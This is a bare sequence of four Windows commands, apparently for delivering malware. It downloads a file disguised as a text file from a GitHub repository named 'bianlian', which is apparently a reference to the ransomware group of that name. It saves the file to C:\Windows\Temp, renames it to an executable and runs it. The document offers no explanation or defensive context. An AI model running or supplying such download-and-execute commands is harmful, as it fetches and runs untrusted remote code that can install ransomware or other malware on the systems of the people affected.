Powershell.exe Invoke-WebRequest ‘https://github.com/keithmcintyre/bianlian/blob/main/file1.txt?raw=true’ -OutFile C:\Windows\Temp\file1.txt
ren C:\Windows\Temp\file1.txt file1.exe
cd C:\Windows\Temp
./file1.exe
